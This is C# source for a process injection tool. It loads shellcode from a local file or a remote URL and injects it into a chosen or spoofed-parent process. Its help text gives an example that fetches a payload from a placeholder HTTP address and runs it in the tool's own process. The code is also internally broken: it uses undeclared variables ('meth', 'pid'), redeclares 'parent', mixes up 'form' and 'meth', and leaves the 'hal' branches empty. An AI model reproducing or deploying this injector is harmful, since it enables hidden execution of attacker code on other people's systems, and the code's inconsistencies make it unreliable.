using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Collections.Generic;

namespace ProcessInjection
{
  class Program
  {


    static void Main(string[] args)
    {
      // init some vars yo
      bool isSelf = false;
      string targ = String.Empty;
      string form = String.Empty;
      string parent = String.Empty;
      string spawn = String.Empty;
      byte[] sc;
      string[] keys = new string[] { "meth", "pid", "parent", "spawn", "targ", "form" };

      if (args.Length > 0) {
        if (args[0].ToLower() == "-h" || args[0].ToLower() == "--help" || args[0].ToLower() == "help") {
          Help();
          return;
        }
      }

      // parsing and normalization
      var parsed = Parser.ParseArgs(args, keys);

      if (parsed.ContainsKey("pid") && parsed["pid"].Length > 0) {
        if (parsed.ContainsKey("parent") || parsed.ContainsKey("spawn")) {
          Console.WriteLine("[!] Cannot pass in parent/spawn values with the pid option");
          return;
        }
        parsed["parent"] = String.Empty;
        parsed["spawn"] = String.Empty;
        // pid = parsed["pid"] ; skip def for now
      } else {
        // parent spawn mode
        if (parsed.ContainsKey("pid")) {
          Console.WriteLine("[!] Cannot pass in pid with the parent/spawn option");
          return;
        } else if (!parsed.ContainsKey("parent") || !parsed.ContainsKey("spawn")) {
          Console.WriteLine("[!] Arguments missing either parent or spawn args.");
          return;
        }
        parsed["pid"] = String.Empty;
        parent = parsed["parent"];
        spawn = parsed["spawn"];
      }


      // main work
      if (!Parser.ContainsAll(parsed, keys)) {
        Help();
        return;
      } else {
        // main work after key check
        if (parent.Length > 0) {
          if (!File.Exists(spawn)) {
            spawn = Resolver.FullExeInPath(spawn);
            if (spawn.Length < 1 || !File.Exists(spawn)) {
              Console.WriteLine($"[!] Spawn path {spawn} does not exist and could not be found.");
              return;
            }
            int parentPid = Resolver.PID(parent);
            Console.WriteLine($"[>] Parent: {parent}");
            Console.WriteLine($"[>] Parent PID: {parentPid}");
            Console.WriteLine($"[>] Spawn: {spawn}");
            form = parsed["form"].ToLower();

            sc = Resolver.SC(targ, form);
            if (sc.Length < 1) {
              Console.WriteLine("[!] No target data resolved from disk or over network. Quiting.");
              return;
            }

            Parent parent = new Parent();
            Win32.PROCESS_INFORMATION info = Parent.Init(parentPid, spawn);

            if (form == "simple") {
              try {
                Simple.Run(sc, info.dwProcessId, false);
              } catch (Exception e) {
                Console.WriteLine("[!] A bad thing happened. Sorry about that.");
                DumpError(e);
                return;
              }
            } else if (form == "hal") {

            } else {
              Console.WriteLine($"Invalid meth option '{meth}'. Valid options are hal, simple, or apc");
              return;
            }
          }

        } else {
          Console.WriteLine("[>] Live mode activated.");
          pid = Resolver.PID(parsed["pid"]);
          if (pid < 1) {
            string dbgPid = parsed["pid"];
            Console.WriteLine($"[!] Unable to find pid {dbgPid}.");
            return;
          }
          // target pid can be numeric id, 'self', or name or process
          Console.WriteLine($"[>] Target pid: {pid}");

          form = parsed["form"].ToLower();
          targ = parsed["targ"];
          sc = Resolver.SC(targ, form);
          if (sc.Length < 1) {
            Console.WriteLine("[!] No target data resolved from disk or over network. Quiting.");
            return;
          }

          meth = parsed["meth"].ToLower();


          if (meth == "simple") {
            try {
              Simple.Run(sc, pid, isSelf);
            } catch (Exception e) {
              Console.WriteLine("[!] A bad thing happened. Sorry about that.");
              DumpError(e);
              return;
            }
          } else if (meth == "hal") {


          } else {
            Console.WriteLine($"Invalid meth option '{meth}'. Valid options are hal, simple, or apc");
            return;
          }
        }

      }

    }

    public static void DumpError(Exception e)
    {
      Console.Error.WriteLine("[x] Error:");
      Console.Error.WriteLine("    {0}", e.Message);
      Console.Error.WriteLine("    {0}", e.StackTrace);
    }

    public static void Help()
    {
      Console.Error.WriteLine("[x] Invalid number of arguments");
      Console.Error.WriteLine("    Usage: ProcessInjection.exe <pid|self> <binlocation> <bintype>");
      Console.Error.WriteLine("    Example: ProcessInjection.exe self http://x.x.x.x/app.b64 b64");
      Console.Error.WriteLine("    Example: ProcessInjection.exe 1000 C:\\Temp\\app.bin bin");
    }
  }

}